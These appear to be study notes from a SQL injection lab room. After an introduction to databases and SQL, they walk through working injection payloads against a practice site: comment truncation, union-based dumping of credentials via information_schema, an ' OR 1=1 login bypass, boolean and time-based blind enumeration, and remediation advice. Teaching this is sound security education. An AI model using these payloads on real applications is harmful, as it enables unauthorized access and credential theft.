# SQL (Structured Query Language) Injection
* Generally referred to as SQLi.
* An attack on a web application database server that causes malicious queries to be executed.
* When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas.
* This is why as well as SQLi being one of the oldest web application vulnerabilities, it also can be the most damaging.

## What is a Database?
* A way of electronically storing collections of data in an organised manner.
* Controlled by a Database Management System (DBMS).
  * DBMSs can be either Relational or Non-Relational.
    * Some common Relational databases are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite.
* Can be multiple databases within a DBMS each containing its own set of related data.
  * For example, there may have a database called `shop` that contains:
    * Information about products available to purchase.
    * Users who have signed up to the online shop.
    * Information about the orders received.
     * This information is separately in the database using tables.
       * Tables are identified with a unique name for each one.
* A business might have other separate databases to store staff information or the accounts team.

### Tables
* Made up of columns and rows.
* A useful way to imagine a table is a grid with the columns going across the top from left to right containing the name of the cell and the rows going from top to bottom with each one having the actual data.

### Columns
* Each column has a unique name per table.
  * Columns are better referred to as a field.
* The type of data to contain is set when a column is created.
  * Common ones being integer (numbers), strings (standard text) or dates. 
* Some databases can contain much more complex data, such as geospatial, which contains location information.
* Setting the data type also ensures that incorrect information isn't stored.
  * Such as the string "hello world" being stored in a column meant for dates.
  * If this happens the database server will usually produce an error message.
* A column containing an integer can also have an auto-increment feature enabled.
  * This gives each row of data a unique number that grows (increments) with each subsequent row.
  * Doing so creates what is called a key field.
    * A key field has to be unique for every row of data which can be used to find that exact row in SQL queries.

### Rows
* AKA records.
* What actually contain the individual lines of data.
* A new row/record is created when data is added to the table.
* A row/record is removed when data is deleted.

### Relational vs Non-Relational Databases
* Relational databases:
  * Store information in tables.
  * Often the tables have shared information between them.
  * Use columns to specify and define the data being stored.
  * Use rows to actually store the data.
  * The tables will often contain a column that has a unique ID (primary key).
    * This will then be used in other tables to reference it.
    * Causes a relationship between the tables.
      * Hence the name relational database.
* Non-relational databases (sometimes called NoSQL) are:
  * Any sort of database that doesn't use tables, columns and rows to store the data.
  * A specific database layout doesn't need to be constructed.
  * Each row of data can contain different information.
    * Can give more flexibility over a relational database.
  * Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.

## What is Structured Query Language (SQL)?
* Feature rich language used for querying databases.
* SQL queries are better referred to as statements.
* Simplest of the commands are used to retrieve (select), update, insert and delete data.
* Some database servers have their own syntax and slight changes to how things work.
* SQL syntax is not case sensitive.

### SELECT
* Query used to retrieve data from the database. 
```
select * from users;
```
| id | username | password
| --- | --- | ---
| 1 | jon | pass123
| 2 | admin | p4ssword
| 3 | martin | secret123

* `SELECT` tells the database we want to retrieve some data.
* `*` tells the database all columns should be received back from the table.
  * For example, the table may contain three columns (`id`, `username` and `password`).
* `from users` tells the database to retrieve the data from the table named `users`.
* The semicolon at the end tells the database that this is the end of the query.
* The next query requests the `username` and `password` field instead of using the `*` to return all columns in the database table.
```
select username,password from users;
```
| username | password
| --- | ---
| jon | pass123
| admin | p4ssword
| martin | secret123

* The following query returns all the columns by using the `*` selector but uses the `LIMIT 1` clause.
  * This forces the database only to return one row of data.
* Changing the query to `LIMIT 1,1` forces the query to skip the first result, and then `LIMIT 2,1` skips the first two results, and so on.
  * Need to remember the first number tells the database how many results to skip, and the second number tells the database how many rows to return.
```
select * from users LIMIT 1;
```
| id | username | password
| --- | --- | ---
| 1 | jon | pass123

* Utilise the `where` clause to return data that matches specific clauses:
```
select * from users where username='admin';
```
| id | username | password
| --- | --- | ---
| 2 | admin | p4ssword

* This will only return the rows where the `username` is equal to `admin`.
```
select * from users where username != 'admin';
```
| id | username | password
| --- | --- | ---
| 1 | jon | pass123
| 3 | martin | secret123

* This will only return the rows where the `username` is NOT equal to `admin`.
```
select * from users where username='admin' or username='jon';
```
| id | username | password
| --- | --- | ---
| 1 | jon | pass123
| 2 | admin | p4ssword

* This will only return the rows where the `username` is either equal to `admin` or `jon`. 
```
select * from users where username='admin' and password='p4ssword';
```
| id | username | password
| --- | --- | ---
| 2 | admin | p4ssword

* This will only return the rows where the `username` is equal to `admin` and the `password` is equal to `p4ssword`.
* Using the `like` clause allows data to be specified that isn't an exact match.
  * Either startss, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign `%`.
```
select * from users where username like 'a%';
```
| id | username | password
| --- | ---- | ---
| 2 | admin | p4ssword

* This returns any rows with `username` beginning with the letter `a`.
```
select * from users where username like '%n';
```
| id | username | password
| --- | --- | ---
| 1 | jon | pass123
| 2 | admin | p4ssword
| 3 | martin | secret123

* This returns any rows with `username` ending with the letter `n`.
```
select * from users where username like '%mi%';
```
| id | username | password
| --- | ---- | ---
| 2 | admin | p4ssword

* This returns any rows with a `username` containing the characters `mi` within them.
### UNION
* This statement combines the results of two or more `SELECT` statements to retrieve data from either single or multiple tables.
  * The rules to this query are that:
    * The `UNION` statement must retrieve the same number of columns in each `SELECT` statement.
    * The columns have to be of a similar data type and the column order has to be the same. 
* A company wants to create a list of addresses for all customers and suppliers to post a new catalogue.
* They have one table called `customers` with the following contents:

| id | name | address | city | postcode
| --- | --- | ---- | --- | ---
| 1 | Mr John Smith | 123 Fake Street | Manchester | M2 3FJ
| 2 | Mrs Jenny Palmer | 99 Green Road | Birmingham | B2 4KL
| 3 | Miss Sarah Lewis | 15 Fore Street | London | NW12 3GH

* And another called `suppliers` with the following contents:

| id | company | address | city | postcode
| --- | --- | --- | --- | ---
| 1 | Widgets Ltd | Unit 1a, Newby Estate | Bristol | BS19 4RT
| 2 | The Tool Company | 75 Industrial Road | Norwich | N22 3DR
| 3 | Axe Makers Ltd | 2b Makers Unit, Market Road | London | SE9 1KK

* The results can be gathered from the two tables and put them into one result set using the following SQL Statement:
```
SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
```
| name | address | city | postcode
| --- | --- | --- | ---
| Mr John Smith | 123 Fake Street | Manchester | M2 3FJ
| Mrs Jenny Palmer | 99 Green Road | Birmingham | B2 4KL
| Miss Sarah Lewis | 15 Fore Street | London | NW12 3GH
| Widgets Ltd | Unit 1a, Newby Estate | Bristol | BS19 4RT
| The Tool Company | 75 Industrial Road | Norwich| N22 3DR
| Axe Makers Ltd | 2b Makers Unit, Market Road | London | SE9 1KK

### INSERT
* This statement tells the database we wish to insert a new row of data into the table.
```
insert into users (username,password) values ('bob','password123');
```
* `into users` tells the database which table to insert the data into.
* `(username,password)` provides the columns to provide data for.
* `values ('bob','password');` provides the data for the previously specified columns.
  
| id | username | password
| --- | --- | ---
| 1 | jon | pass123
| 2 | admin | p4ssword
| 3 | martin | secret123
| 4 | bob | password123

### UPDATE
* This statement tells the database to update one or more rows of data within a table.
* Specify the table to update using `update %tablename% SET` and then select the field or fields to update as a comma-separated list such as `username='root',password='pass123'` then finally specify exactly which rows to update using the `where` clause such as `where username='admin;`.
```
update users SET username='root',password='pass123' where username='admin';
```
|  id | username | password
| --- | --- | ---
| 1 | jon | pass123
| 2 | root | pass123
| 3 | martin | secret123
| 4 | bob | password123

### DELETE
* This statement tells the database we wish to delete one or more rows of data.
* Precisely which data to delete can be specified using the where clause and the number of rows to be deleted using the `LIMIT `clause.
```
delete from users where username='martin';
```
| id | username | password
| --- | --- | ---
| 1 | jon | pass123
| 2 | root | pass123
| 4 | bob | password123
```
delete from users;
```
* Because no `WHERE` clause was being used in the query, all the data is deleted in the table.

## What is SQL Injection?
* When user-provided data gets included in the SQL query.
### SQL Inection Example
* Online blog where each blog entry has a unique `id` number.
* Blog entries may be either set to public or private depending on whether they're ready for public release.
* URL for each blog entry is `https://website.thm/blog?id=1`
* Blog entry being selected comes from the `id` parameter in the query string.
* Web application needs to retrieve the article from the database and uses the SQL statement below:
```
SELECT * from blog where id=1 and private=0 LIMIT 1;
```
* SQL statement is looking in the `blog` table for an article with the `id` number of `1` and the `private` column set to `0`.
  * This means it is able to be viewed by the public and limits the results to only one match.
* The `id` parameter from the query string is used directly in the SQL query.
* Assume that article id 2 is still locked as private, so it cannot be viewed on the website.
* Instead, call the URL directly: `https://website.thm/blog?id=2;--`
* This would produce the SQL statement:
```
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```
* Semicolon in the URL signifies the end of the SQL statement.
* Two dashes cause everything afterwards to be treated as a comment.
* Doing this actually runs the query:
```
SELECT * from blog where id=2;--
```
* This returns the article with an `id` of 2 whether it is set to public or not.
* This was an example of an in-band SQLi vulnerability.

## In-Band SQLi
* The easiest type to detect and exploit.
  * The same method of communication is being used to exploit the vulnerability and also receive the results.
  * For example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.
### Error-Based SQL Injection
* Most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen.
* This can often be used to enumerate a whole database. 

### Error-Based SQLi Example
* Blog URL is still `https://website.thm/article?id=1`
* The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced.
* These are most commonly single apostrophes `'` or a quotation mark `"`.
* Type an apostrophe `'` after the `id=1` and press enter:
```
`https://website.thm/article?id=1'`
```
* This returns an SQL error informing of an error in the syntax:
```
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```
* The fact that this error message has been received confirms the existence of an SQL Injection vulnerability.
* Can now exploit this vulnerability and use the error messages to learn more about the database structure.
* The first thing to do is return data to the browser without displaying an error message.
* Try the `UNION` operator to receive an extra result. Try setting the browsers `id` parameter to:
```
https://website.thm/article?id=1 UNION SELECT 1
```
* This statement produces an error message informingu that the `UNION SELECT` statement has a different number of columns than the original `SELECT` query:
```
SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
```
* Try again, adding another column:
```
https://website.thm/article?id=1 UNION SELECT 1,2
```
* Same error.
* Repeat by adding another column:
```
https://website.thm/article?id=1 UNION SELECT 1,2,3
```
* Success, the error message has gone, and the article is being displayed:
```
My First Article

Article ID: 1
Hi and welcome to my very first article for my new website......
```
* Nnow the goal is to display data instead of the article.
* The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that.
* To get around this, the first query must produce no results.
* This can be done by changing the article `id` from `1` to `0`.
```
https://website.thm/article?id=0 UNION SELECT 1,2,3
```
* The article is just made up of the result from the `UNION` select returning the column values 1, 2, and 3:
```
2

Article ID: 1
3
```
* Use the returned values to retrieve more useful information.
* Get the database name:
```
https://website.thm/article?id=0 UNION SELECT 1,2,database()
```
* Where the number 3 was previously displayed; it now shows the name of the database, which is `sqli_one`:
```
2

Article ID: 1
sqli_one
```
* Now gather a list of tables that are in this database.
```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
* The method `group_concat()` gets the specified column (in this case, `table_name`) from multiple returned rows and puts it into one string separated by commas.
* Every user of the database has access to the `information_schema` database and it contains information about all the databases and tables the user has access to.
* In this particular query, the goal is to list all the tables in the `sqli_one` database, which are `article` and `staff_users`:
```
2

Article ID: 1
article,staff_users
```
* The aim is to discover Martin's password so the `staff_users` table is what is of interest.
* Utilise the `information_schema` database again to find the structure of this table using the query:
```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
* The information to retrieve has changed from `table_name` to `column_name`, the table being queried in the `information_schema` database has changed from `tables` to `columns`, and rows are being searched where the `table_name` column has a value of `staff_users`.
* The query results provide three columns for the `staff_users` table: `id`, `password`, and `username`:
```
2

Article ID: 1
id,username,password
```
* Use the `username` and `password` columns for the next query to retrieve the user's information:
```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
* Use the `group_concat` method to return all of the rows into one string and to make it easier to read.
* Add `,':',` to split the username and password from each other.
* Use the HTML `<br` tag that forces each result to be on a separate line to make for easier reading instead of being separated by a comma.
```
2

Article ID: 1
admin:p4ssword
martin:pa$$word
jim:work123
```

### Union-Based SQL Injection
* Utilises the SQL `UNION` operator alongside a `SELECT` statement to return additional results to the page.
* This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

## Blind SQL Injection - Authentication Bypass
* Blind SQLi is when there is little to no feedback to confirm whether injected queries were successful or not.
* This is because the error messages have been disabled, but the injection still works regardless.
* All is needed is that little bit of feedback to successfully enumerate a whole database.

### Authentication Bypass
* One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms.
  * Not interested in retrieving data from the database; just want to get past the login.
* Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the `users` table.
* The web application is asking the database "do you have a user with the username `bob` and the password `bob123?`", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not.
* Taking the above information into account, it's unnecessary to enumerate a valid username/password pair.
* Just need to create a database query that replies with a yes/true.

#### Blind SQL Injection - Authentication Bypass Example
* `https://website.thn/login` displays a username and password login form.
* SQL query for the login form shows the following:
```
select * from users where username='%username%' and password='%password%' LIMIT 1;
```
* %username% and %password% values are taken from the login form fields.
  * The initial values are blank as these fields are currently empty.
* To make this into a query that always returns as true, enter the following into the password field:
```
' OR 1=1;--
```
* This turns the SQL query into:
```
select * from users where username='' and password='' OR 1=1;
```
* Because `1=1` is a true statement and an OR operator is being used, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.
  
## Blind SQL Injection - Boolean Based
* Refers to the response received back from injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes.
  * That outcome confirms that the SQL Injection payload was either successful or not.
* With just these two responses, it's possible to enumerate a whole database structure and contents.

### Blind SQL Injection - Boolean Based Example
* `https://website.thn/login` displays a username and password login form.
* `https://website.thm/checkuser?username=admin` browser body contains `{"taken":true}`.
  * API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username.
* Assumption that the username of `admin` is already registered because the `taken` value is set to `true.
  * Confirm this by changing the username in the browser's address bar from `admin` to `admin123`, and upon pressing enter, the value `taken` changes to `false`.
* The SQL query that is processed looks like:
```
select * from users where username = '%username%' LIMIT 1;
```
* Username is the only input that can be controlled in the query string so have to use this to perform the SQL Injection.
* Keep the username as `admin123` and start appending to this to try and make the database confirm true things, which will change the state of the `taken` field from `false` to `true`.
* First task is to establish the number of columns in the `users` table, which can be achieved by using the `UNION` statement.
* Change the username value to the following:
```
admin123' UNION SELECT 1;-- 
```
* This is the incorrect value of columns as the web application has responded with the value `taken` as `false`.
* This statement also produces an error message informingu that the `UNION SELECT` statement has a different number of columns than the original `SELECT` query:
```
SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
```
* Keep on adding more columns until the `taken` value is `true`.
* Confirm that the answer is three columns by setting the `username` to the below value:
```
admin123' UNION SELECT 1,2,3;-- 
```
* Now that the number of columns has been established, enumerate the database.
* First task is discovering the database name.
* Do this by using the built-in `database()` method and then using the `like` operator to try and find results that will return a `true` status.
* Use the below `username` value:
```
admin123' UNION SELECT 1,2,3 where database() like '%';--
```
* `true` response is received because the `like` operator has the wildcard value of `%`, which will match anything.
* Change the wildcard operator to `a%` to see the response goes back to `false`, which confirms that the database name does not begin with the letter `a`.
* Cycle through all the letters, numbers and characters such as `-` and `_` until a match is discovered.
* Send the below as the `username `value to receive a `true` response that confirms the database name begins with the letter `s`.
```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```
* Move onto the next character of the database name until another `true` response is received, for example, 'sa%', 'sb%', 'sc%' etc.
* Continue with this process until all the characters of the database name are discovered, which is `sqli_three`.
* The database name is now known, which can now be used to enumerate table names using a similar method by utilising the `information_schema` database.
* Set the username to the following value:
```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```
* This query looks for results in the `information_schema` database in the `tables` table where the database name matches `sqli_three`, and the table name begins with the letter `a`.
* The above query results in a `false` response to confirm that there are no tables in the `sqli_three` database that begin with the letter `a`.
* Cycle through letters, numbers and characters until a positive match is found.
* A table will be discovered in the `sqli_three` database named `users`, which can be confirmed by running the following username payload:
```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```
* Now need to enumerate the column names in the `users` table to properly search it for login credentials.
* Using the payload below, search the columns table where the database is equal to `sqli_three`, the table name is `users`, and the column name begins with the letter `a`.
```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```
* Cycle through letters, numbers and characters again until a match is found.
* As multiple results are being searched for, add each new column name to the payload when found to prevent discovering the same one again.
  * For example, once the column named `id` is found, append that to the original payload (as seen below).
```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```
* Repeating this process three times will  discover the columns `id`, `username` and `password`.
* This can use to query the `users` table for login credentials.
* Need to discover a valid username using the payload below:
```
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```
* Cycling through the characters will confirm the existence of the username `admin`.
* Now concentrate on discovering the password.
* The payload below shows how to find the password:
```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```
* Cycling through all the characters will discover the password is `3845`.

## Blind SQL Injection - Time Based
* Very similar to Boolean based as same requests are sent.
* No visual indicator of queries being wrong or right.
* Indicator of a correct query is based on the time the query takes to complete.
* Time delay is introduced by using built-in methods such as `SLEEP(x)` alongside the `UNION` statement.
* `SLEEP()` method will only ever get executed upon a successful `UNION SELECT` statement.
* Use the following query when trying to establish the number of columns in a table:
```
admin123' UNION SELECT SLEEP(5);--
```
* Query was unsuccessful if there was no pause in the response time.
* Add another column and try again:
```
admin123' UNION SELECT SLEEP(5),2;--
```
* This payload produces a 5-second time delay, which confirms the successful execution of the `UNION` statement and that there are two columns.
* Repeat the enumeration process from the Boolean based SQL Injection, adding the `SLEEP()` method into the `UNION SELECT` statement.
  * E.g. to find the table name the query would be: `referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--`

## Out-of-Band SQL Injection
* Not as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.
* Classified by having two different communication channels, one to launch the attack and the other to gather the results. 
  * For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.
### Out-of-Band SQL Injection Example
1. An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.
2. The Website makes an SQL query to the database which also passes the hacker's payload.
3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.
## Remediation
* As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the below advice:
### Prepared Statements (With Parameterised Queries)
* First thing a developer should write is the SQL query and then any user inputs are added as a parameter afterwards. 
* Ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data. 
* Also makes code look a lot cleaner and easier to read.
### Input Validation
* Can go a long way to protecting what gets put into an SQL query.
* Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 
### Escaping User Input
* Allowing user input containing characters such as `' " $ \` can cause SQL Queries to break or, even worse, open them up for injection attacks. 
* Escaping user input is the method of prepending a backslash `\` to these characters, which then causes them to be parsed just as a regular string and not a special character.
